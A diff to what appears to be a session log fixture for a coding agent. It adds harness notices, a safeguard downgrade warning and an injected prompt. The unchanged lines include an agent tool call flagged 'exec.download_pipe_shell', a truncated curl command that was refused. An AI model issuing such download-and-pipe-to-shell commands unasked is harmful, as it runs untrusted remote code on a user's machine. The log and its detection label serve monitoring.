@@ -1,7 +1,8 @@
-SESSION abc123  jdoe@ws-204  /repo  claude-code  model: claude-sonnet-5-5
-2026-10-09 UTC  3 turns, 6 tool calls, 1 highlight  integrity: ok
+SESSION abc123  jdoe@ws-204  /repo  claude-code 2.1.295 -> 2.1.296  model: claude-sonnet-5-5
+2026-10-09 UTC  2 turns, 6 tool calls, 1 highlight, 2 harness notices  integrity: ok
 
 14:00:00  START     -   startup
+14:00:01  TURN END  -   
 14:00:08  PROMPT    t1  "Add retry logic to the upload client and run the tests"
 14:00:11  TOOL      t1  Read   internal/upload/client.go  ->  ok 12ms
 14:00:12  AI        t1  "I'll look at the upload client first."
@@ -12,7 +13,10 @@ SESSION abc123  jdoe@ws-204  /repo  claude-code  model: claude-sonnet-5-5
 14:00:31  TOOL      t1  [HIGH exec.download_pipe_shell] Bash   curl -s https://x...  ->  no result (refused...
 14:00:33  AI        t1  "Added backoff with 3 retries; tests pass."
 14:00:33  TURN END  t1  
+14:00:39  NOTICE    t1  [NOTICE] claude-code version changed from 2.1.295 to 2.1.296
 14:00:40  PROMPT    t2  "Wait for the build"
+14:00:41  NOTICE    t2  [WARNING] safeguards flagged this (cyber): claude-sonnet-5-5 -> claude-sonnet-5 for...
+14:00:41  PROMPT    t2  (injected by the harness) "Your response above was stopped by a safety classifier."
 14:00:42  TOOL      t2  Bash (no hook ran)  sleep 90 && echo done  ->  error: Blocked: sleep...
 14:00:44  PROMPT    t3  (injected by the harness) "<task-notification>build finished</task-notification>"
 14:00:45  TURN END  t2  
